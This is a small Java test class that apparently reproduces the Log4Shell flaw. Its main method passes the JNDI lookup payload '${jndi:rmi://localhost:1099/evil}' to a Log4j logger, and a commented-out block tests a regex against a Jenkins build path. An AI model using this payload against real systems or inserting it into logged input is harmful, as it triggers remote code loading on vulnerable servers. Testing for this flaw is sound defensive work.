package com.hyj.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BugTest {

    private final static Logger LOGGER = LogManager.getLogger(BugTest.class);

    public static void main(String[] args) {
        String username = "";
        LOGGER.info("${jndi:rmi://localhost:1099/evil}");
    }

   /* public static void main(String[] args) {

        Pattern p = Pattern.compile(".*tmssi.war*");
        Matcher m = p.matcher("/var/jenkins_home/workspace/test1/yihuisoft-service/target/tmssi.war");
        LOGGER.info(m.matches());
    }*/

}
